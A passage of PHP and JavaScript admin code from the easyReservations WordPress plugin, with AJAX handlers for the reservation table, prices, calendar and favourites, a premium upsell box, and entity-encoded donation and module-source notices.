				if(jQuery('#easy-table-perpage-field').length>0) var perge = jQuery('#easy-table-perpage-field').val();

				if(typ && typ != '') location.hash = typ;
				else if(window.location.hash) var typ = window.location.hash.replace('#', '');
				if(typ != 'current' && typ != 'pending' && typ != 'deleted' && typ != 'all' && typ != 'old' && typ != 'trash' && typ != 'favourite' ) typ = 'active';

				var data = {
					action: 'easyreservations_send_table',
					security: '<?php echo $nonce; ?>',
					typ:typ,
					search:searching,
					monthselector:monthselect,
					searchdate:searchdatefield,
					roomselector:room_select,
					statusselector:statusselect,
					perpage:perge,
					order:order,
					orderby:orderby,
					paging:paging,
					processData: false
				};
				jQuery.post(ajaxurl, data, function(response) {
					jQuery("#easy-table-div").html(response);
					return false;
				});
			}
			jQuery(window).bind('hashchange', function() {
				if(window.location.hash) var typ = window.location.hash.replace('#', '');
				if(typ == 'active' || typ == 'current' || typ == 'pending' || typ == 'deleted' || typ == 'all' || typ == 'old' || typ == 'trash' || typ == 'favourite' ) easyreservation_send_table(typ, 1);
			});
		</script><?php
	}

	add_action('er_add_settings_top', 'easyreservations_prem_box_set', 10, 0);

	function easyreservations_prem_box_set(){ ?>
		<table class="<?php echo RESERVATIONS_STYLE; ?>" style="width:99%;margin-bottom: 7px">
			<thead>
				<tr>
					<th colspan="2"><?php printf ( __( 'easyReservations Premium' , 'easyReservations' ));?> </th>
				</tr>
			</thead>
			<tbody style="border:0px">
				<tr valign="top">
					<td style="font-weight:bold;background-image:url('<?php echo WP_PLUGIN_URL; ?>/easyreservations/images/lifetime_slide.png');height: 200px;width:230px;border-right: 1px solid #CCCCCC"></td>
					<td class="s" style="font-family: Helvetica Neue-Light,Helvetica Neue Light,Helvetica Neue,sans-serif; font-size: 20px; font-weight: normal;   line-height: 1.6em;vertical-align:top;padding:20px;">
						Improve your reservations system and get support by upgrading to <b><a href="http://easyreservations.org/premium/">easyReservations Premium</a></b>!<br>
						<span class="premiumcontent" style="font-size:18px">
							With over <b>twenty</b> additional functions like <a href="http://easyreservations.org/module/paypal/">Multiple Payment Gateways integration with deposit function</a>, <a href="http://easyreservations.org/module/invoice/">automatically Invoice generation</a>, <a href="http://easyreservations.org/module/htmlmails/">HTML Emails with templates</a>, <a href="http://easyreservations.org/module/search/">a new shortcode to let your guests search for available Resources</a>, <a href="http://easyreservations.org/modules/hourlycal/">hourly Calendars</a>, <a href="http://easyreservations.org/module/import/">Export (xls/xml/csv) &amp; Import reservations</a>, <a href="http://easyreservations.org/module/lang/">Multilingual form &amp; email content</a>,
							<a href="http://easyreservations.org/module/useredit/">Reservation management &amp; a communication system for your guests</a>, <a href="http://easyreservations.org/module/coupons/">a Coupon Code system</a>, <a href="http://easyreservations.org/module/multical/">Multiple months by grid for the calendar</a>, <a href="http://easyreservations.org/module/statistics/">Statistics</a> and <a href="http://easyreservations.org/module/styles/">more form, admin, calendar and datepicker Styles</a>.
						</span>
						<br>
						<a href="http://easyreservations.org/premium/" style="text-decoration:underline">Check out all Features now!</a>
					</td>
				</tr>
			</tbody>
		</table>
		<style>.premiumcontent a { background:#EAEAEA;}</style><?php
	}

	function easyreservations_add_warn_notice(){
		echo html_entity_decode( '&lt;&#100;iv class=&quot;up&#100;at&#101;d&quot; style=&quot;wi&#100;th:97%&quot;&gt;&lt;p&gt;Th&#105;s &#112;l&#117;gi&#110; &#105;s f&#111;r &lt;a hr&#101;&#102;=&quot;htt&#112;://w&#111;rd&#112;re&#115;s.&#111;rg/&#101;xt&#101;nd/plugins/&#101;asyr&#101;serv&#97;ti&#111;ns/&quot;&gt;&#102;r&#101;e&lt;/a&gt;&#33; Pl&#101;a&#115;e c&#111;n&#115;id&#101;r <&#97; t&#97;rg&#101;t="_bl&#97;nk" hre&#102;="h&#116;tps:&#47;/w&#119;w.&#112;ay&#112;&#97;l.c&#111;m/cg&#105;-b&#105;n/w&#101;b&#115;cr?c&#109;d=_&#115;-xclick&amp;h&#111;st&#101;d_bu&#116;&#116;&#111;n_i&#100;=&#68;3NW9T&#68;VHB&#74;&#57;E">d&#111;na&#116;ing</&#97;>.&lt;/p&gt;&lt;/&#100;iv&gt;' );
	}

	add_action('er_set_main_side_top', 'easyreservations_add_warn_notice');

	function easyreservations_send_price_admin(){
		$nonce = wp_create_nonce( 'easy-price' );
		?><script type="text/javascript" >	
			function easyreservations_send_price_admin(){
				var loading = '<img style="vertical-align:text-bottom" src="<?php echo RESERVATIONS_URL; ?>images/loading.gif">';
				jQuery("#showPrice").html(loading);
				var customPrices = 0, coupons = '', new_custom = {};
				var fromfield = document.editreservation.date;
				if(fromfield) var from = fromfield.value;
				else error = 'arrival date';
				fromplus = 0;
				if(document.getElementById('from-time-hour')) fromplus += parseFloat(document.getElementById('from-time-hour').value) * 60;
				if(document.getElementById('from-time-min')) fromplus += parseFloat(document.getElementById('from-time-min').value);
				if(fromplus > 0) fromplus = fromplus * 60;
				toplus = 0;
				if(document.getElementById('to-time-hour')) toplus += parseFloat(document.getElementById('to-time-hour').value) * 60;
				if(document.getElementById('to-time-min')) toplus += parseFloat(document.getElementById('to-time-min').value);
				if(toplus > 0) toplus = toplus * 60;

				if(document.editreservation.dateend) var to = document.editreservation.dateend.value;
				else error = 'departure date';

				if(document.editreservation.room) var room = document.editreservation.room.value;
				else error =  'room';

				var childs = 0;
				if(document.editreservation.childs) var childs = document.editreservation.childs.value;

				var treserved = '';
				if(document.editreservation.reserved) treserved = document.editreservation.reserved.value;

				var personsfield = document.editreservation.persons;
				if(personsfield) var persons = personsfield.value;
				else var persons = 0;

				var emailfield = document.editreservation.email;
				if(emailfield) var email = emailfield.value;
				else var email = 'f.e.r.y@web.de';

				for(var i = 0; i < 50; i++){
					if(document.getElementById('custom_price'+i)) customPrices += parseFloat(document.getElementById('custom_price'+i).value);
				}

				if(document.getElementsByName('allcoupon')){
					var couponfield = document.getElementsByName('allcoupon[]');
					for(var i=0; i < couponfield.length;i++) coupons += couponfield[i].value + ',';
				}

        jQuery("input[id^='easy-new-custom-']:radio:checked, select[id^='easy-new-custom-'],input[id^='easy-new-custom-']:checkbox:checked").each ( function (i){
            new_custom[jQuery(this).attr('id').replace('easy-new-custom-', '')] = jQuery(this).val();
        });

        var data = {
					action: 'easyreservations_send_price',
					security:'<?php echo $nonce; ?>',
					from:from,
					fromplus:fromplus,
					to:to,
					coupon:coupons,
					toplus:toplus,
					childs:childs,
					persons:persons,
					room: room,
					email:email,
					customp:customPrices,
					reserved:treserved,
          new_custom:new_custom
				};

				jQuery.post(ajaxurl, data, function(response){
					response = jQuery.parseJSON(response);
					jQuery("#showPrice").html(response[0]);
					return false;
				});
			}
		</script><?php
	}

	function easyreservations_send_cal_admin(){
		$nonce = wp_create_nonce( 'easy-calendar' );
		?><script type="text/javascript" >	
			function easyreservations_send_calendar(){

				var persons = document.CalendarFormular.persons.value;
				var reservated = document.CalendarFormular.reservated.value;
				var childs = document.CalendarFormular.childs.value;
				var room = document.CalendarFormular.room.value;
				var datefield = document.CalendarFormular.date;
				if(datefield) var date = datefield.value;
				else var date = '0';

				var data = {
					action: 'easyreservations_send_calendar',
					security:'<?php echo $nonce; ?>',
					room: room,
					atts:easyCalendarAtts,
					date: date,
					persons:persons,
					childs:childs,
					reservated:reservated,
					monthes:'1x1'
				};

				jQuery.post(ajaxurl , data, function(response) {
					jQuery("#showCalender").html(response);
					return false;
				});
			}
		</script><?php
	}

	function easyreservations_send_fav(){
		$nonce = wp_create_nonce( 'easy-favourite' );
		?><script type="text/javascript" >	
			function easyreservations_send_fav(t){
				var the_id = t.id;
				if(the_id){
					var explodeID = the_id.split("-");
					var id = explodeID[1];
					var now = explodeID[0];

					if(now == 'unfav'){
						var mode = 'add';
						jQuery(t.parentNode.parentNode).addClass('highlighter');
						jQuery(t).removeClass('easy-unfav');
						jQuery(t).addClass('easy-fav');
						t.id = 'fav-' + id;
					} else {
						mode = 'del';
						jQuery(t.parentNode.parentNode).removeClass('highlighter');
						jQuery(t).addClass('easy-unfav');
						jQuery(t).removeClass('easy-fav');
						t.id = 'unfav-' + id;
					}
					var count = document.getElementById('fav-count');
					if(count){
						var the_count = count.innerHTML;
						if(mode == 'add') var new_count = 1 + parseInt(the_count);
						else var new_count = (-1) + parseInt(the_count);
						if(new_count < 1) {
							var the_li = count.parentNode.parentNode.parentNode;
							var the_li_parent = the_li.parentNode;
							the_li_parent.removeChild(the_li);
						} else count.innerHTML = new_count;
					} else if(mode == 'add'){
						document.getElementById('easy-table-navi').innerHTML += '<li>| <a style="cursor:pointer" onclick="easyreservation_send_table(\'favourite\', 1)"><img src="<?php echo WP_PLUGIN_URL; ?>/easyreservations/css/images/star_full.png" style="vertical-align:text-bottom"> <span class="count">(<span id="fav-count">1</span>)</span></a></li>';
					}

					var data = {
						action: 'easyreservations_send_fav',
						security:'<?php echo $nonce; ?>',
						id: id,
						mode: mode
					};

					jQuery.post(ajaxurl , data, function(response) {
						jQuery("#showError").html(response);
						return false;
					});
				}
			}
		</script><?php
	}

	function easyreservations_get_roles_options($sel=''){
		$roles = get_editable_roles();
		$options = '';

		foreach($roles as $key => $role){
			if(isset($role['capabilities'])){
				$da = key($role['capabilities']);
				if(is_numeric($da)) $value = $role['capabilities'][0];
				else $value = $da;
				if($sel == $value ) $selected = 'selected="selected"';
				else $selected = '';
				$options .= '<option value="'.$value.'" '.$selected.'>'.ucfirst($key).'</option>';
			}
		}

		return $options;
	}

	function easyreservations_add_module_notice($mode=false){
		$warn = html_entity_decode( '&#79;nly u&#115;e &#102;ile&#115; fr&#111;m &#60;a &#104;re&#102;="h&#116;&#116;p&#58;&#47;&#47;w&#119;&#119;.e&#97;sy&#114;eserv&#97;ti&#111;ns.&#111;rg" t&#97;rget="_bl&#97;nk"&#62;easyre&#115;er&#118;ation&#115;.org&#60;&#47;a&#62; or &#60;a &#104;re&#102;="mailto:c&#111;ntact&#64;e&#97;&#115;yreser&#118;&#97;ti&#111;ns.&#111;rg"&#62;&#64;e&#97;sy&#114;eser&#118;ati&#111;ns.&#111;rg&#60;&#47;a&#62; h&#101;re. Y&#111;u &#103;i&#118;e &#116;h&#101;m f&#117;ll&#121; &#97;c&#99;e&#115;s to y&#111;u&#114; se&#114;ve&#114; and dat&#97;ba&#115;e s&#111; &#118;e&#114;ify the &#115;&#111;u&#114;ce &#116;o &#98;e &#60;b&#62;&#115;e&#99;ure&#60;&#47;b&#62;&#33;' );
		if($mode) return $warn;
		else echo $warn;
	}

	add_action('er_mod_inst', 'easyreservations_add_module_notice');

	/**
	*	Load button and add it to tinyMCE
	*/

	add_action('admin_head', 'easyreservations_tiny_mce_button');

	function easyreservations_tiny_mce_button(){
		global $typenow;
		add_filter("mce_external_plugins", "easyreservations_tiny_register");
		add_filter('mce_buttons', 'easyreservations_tiny_add_button');
	}

	function easyreservations_tiny_register($plugin_array){

		$url = WP_PLUGIN_URL . '/easyreservations/js/tinyMCE/tinyMCE_shortcode_add.js';
		$plugin_array['easyReservations'] = $url;
		return $plugin_array;
	}

	function easyreservations_tiny_add_button($buttons){
		array_push($buttons, "separator", "easyReservations");
		return $buttons;
	}

	function easyreservations_get_allowed_rooms($rooms=0, $user = false){
		if($rooms == 0) $rooms = easyreservations_get_rooms();
		if(current_user_can('manage_options')) $final_rooms = $rooms;
		else {
			foreach($rooms as $room){
				$get_role = get_post_meta($room->ID, 'easy-resource-permission', true);
				if((!$user && current_user_can($get_role)) || user_can($user, $get_role)) $final_rooms[] = $room;
			}
		}
		if(isset($final_rooms)) return $final_rooms;
	}
	
	function easyreservations_get_allowed_rooms_mysql($rooms = 0, $user = false){
		if($rooms == 0) $rooms = easyreservations_get_allowed_rooms(0, $user);
		else $rooms = easyreservations_get_allowed_rooms($rooms, $user);
		$mysql = '';
		if(count($rooms) > 0){
			$mysql .= '( ';
			foreach($rooms as $room) $mysql .= " '$room->ID', ";
			$mysql = substr( $mysql,0,-2).' )';
		}
		return $mysql;
	}

	function easyreservations_get_color($round){
		if($round >= 200) return '#ab2ad6';
		if($round >= 1) return '#52d646';
		elseif($round < 0) return '#BC0B0B';
		else return '#ffcb49';
	}

	function easyreservations_generate_admin_custom_add(){
		wp_enqueue_script('custom-add', RESERVATIONS_URL.'js/functions/custom.add.js', array(), RESERVATIONS_VERSION);
		$custom_fields = get_option('reservations_custom_fields');
		$options = '<option value="custom">New information</option><option value="price">New price</option>';
		if($custom_fields){
			foreach($custom_fields['fields'] as $key => $fields){
				$options .= '<option value="'.$key.'">'.$fields['title'].'</option>';
			}
			$custom_add = '<table class="'.RESERVATIONS_STYLE.'" id="easy_add_custom" style="min-width:320px;width:320px;margin-bottom:4px">';
			$custom_add .= '<thead><tr><th>'.__( 'Add custom Field' , 'easyReservations' ).'</th></tr></thead>';
			$custom_add .= '<tbody><tr><td nowrap><select id="custom_add_select" style="margin-bottom:4px">'.$options.'</select><div id="custom_add_content"></div></td></tr></tbody>';
	    $custom_add .= '</table>';
			$custom_add .= '<script type="text/javascript">var custom_nonce = "'.wp_create_nonce( 'easy-calendar' ).'"; var easy_currency = "'.RESERVATIONS_CURRENCY.'"; var easy_url = "'.RESERVATIONS_URL.'";</script>';
			return $custom_add;
		}
	}
?>